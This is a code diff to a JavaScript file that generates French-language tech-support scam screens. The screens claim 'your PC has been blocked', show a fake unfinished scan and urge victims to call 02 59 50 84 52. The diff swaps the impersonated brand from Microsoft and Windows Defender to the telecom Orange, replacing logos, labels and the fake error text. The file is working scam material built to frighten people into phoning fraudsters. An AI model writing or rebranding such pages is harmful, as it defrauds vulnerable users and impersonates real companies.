@@ -18,36 +18,26 @@
     '<section class="access-modal" aria-label="Alerte acces bloque">' +
     '<p>L\'accès à votre pc a été bloqué pour des raisons de sécurité.</p>' +
     '<p>N\'accédez pas à ce pc et ne le redémarrez pas. Si vous ignorez cet avertissement, vous risquez de perdre des informations.</p>' +
-    '<p>Contactez l\'assistance dès que possible ; un expert Microsoft vous guidera par téléphone lors de l\'analyse.</p>' +
+    '<p>Contactez l\'assistance dès que possible ; un expert Orange vous guidera par téléphone lors de l\'analyse.</p>' +
     '<p>L\'exécution de cette application peut mettre votre pc en danger.</p>' +
     '</section>' +
     '<div class="black-modal-blue-box">' +
-    '<p>Assistance Windows : 02 59 50 84 52</p>' +
-    '<p class="black-modal-defender">Windows Defender</p>' +
+    '<p>Assistance Orange : 02 59 50 84 52</p>' +
+    '<p class="black-modal-defender">Assistance Orange</p>' +
     '</div>' +
-    '<section class="scan-modal" aria-label="Analyse Microsoft Defender">' +
+    '<section class="scan-modal" aria-label="Assistance Orange">' +
     '<h2 class="scan-modal-title">Désolé, l\'analyse n\'est pas terminée !</h2>' +
-    '<p class="scan-modal-error">Erreur : 0x800VDS</p>' +
-    '<p class="scan-modal-text">Microsoft Defender a détecté des fichiers infectés mais n\'a pas pu les supprimer en raison des autorisations de stratégie de groupe. Veuillez effectuer une analyse pour les supprimer manuellement.</p>' +
-    '<p class="scan-modal-text">Contactez l\'assistance pour obtenir de l\'aide</p>' +
-    '<p class="scan-modal-support">Windows Support : 02 59 50 84 52</p>' +
+    '<p class="scan-modal-text">Assistance Orange a détecté une anomalie sur votre appareil. Contactez un expert pour une analyse complète et sécuriser votre connexion.</p>' +
+    '<p class="scan-modal-text">Contactez l\'assistance Orange pour obtenir de l\'aide</p>' +
+    '<p class="scan-modal-support">Assistance Orange : 02 59 50 84 52</p>' +
     '<div class="scan-modal-actions">' +
     '<button class="scan-btn scan-btn-now" type="button">Analyser maintenant</button>' +
     '<button class="scan-btn scan-btn-later" type="button">Analyser plus tard</button>' +
     '</div>' +
     '</section>' +
     '</div>' +
-    '<aside class="support-card" aria-label="Support Microsoft">' +
-    '<div class="support-card-header">' +
-    '<div class="support-card-logo" aria-hidden="true">' +
-    '<svg viewBox="0 0 20 20" role="img" aria-hidden="true">' +
-    '<rect x="1" y="1" width="8" height="8" fill="#f25022"/>' +
-    '<rect x="11" y="1" width="8" height="8" fill="#7fba00"/>' +
-    '<rect x="1" y="11" width="8" height="8" fill="#00a4ef"/>' +
-    '<rect x="11" y="11" width="8" height="8" fill="#ffb900"/>' +
-    '</svg></div>' +
-    '<span class="support-card-brand">Microsoft</span></div>' +
-    '<p class="support-card-subtitle">Support technique Windows</p>' +
+    '<aside class="support-card" aria-label="Assistance Orange">' +
+    '<p class="support-card-subtitle">Assistance Orange</p>' +
     '<p class="support-card-phone">02 59 50 84 52</p>' +
     '<p class="support-card-label">Numero</p>' +
     '<div class="support-card-arrow" aria-hidden="true">▼</div></aside></div>' +
@@ -88,9 +78,10 @@
     '<div class="fb-bg-overlay" aria-hidden="true"></div>' +
     '<h1 class="warning-text">votre ordinateur est bloque</h1>' +
     '<section class="modal" aria-label="Modale carree">' +
-    '<header class="fb-submodal-header"><div class="fb-logo" aria-hidden="true">' +
-    '<svg viewBox="0 0 36 36" role="img" aria-hidden="true"><circle cx="18" cy="18" r="18" fill="#ffffff"/>' +
-    '<path d="M24.5 18.5h-3.2v10.5h-4.3V18.5h-2.2v-3.7h2.2v-2.4c0-2.2 1.3-3.4 3.3-3.4.9 0 1.9.2 1.9.2v2.1h-1.1c-1.1 0-1.4.7-1.4 1.4v1.7h3.5l-.5 3.7z" fill="#1877F2"/></svg></div>' +
+    '<header class="fb-submodal-header"><div class="orange-logo" aria-hidden="true">' +
+    '<svg viewBox="0 0 110 32" role="img" aria-hidden="true">' +
+    '<text x="0" y="24" fill="#ffffff" font-family="Arial, Helvetica, sans-serif" font-size="24" font-weight="700">orange</text>' +
+    '</svg></div>' +
     '<button class="fb-close" id="fbCloseBtn" type="button" aria-label="Fermer">&times;</button></header>' +
     '<div class="fb-submodal-separator" aria-hidden="true"></div><div class="modal-content"><div class="modal-top">' +
     '<div class="warning-icon" aria-hidden="true"><svg viewBox="0 0 64 64" role="img" aria-hidden="true">' +
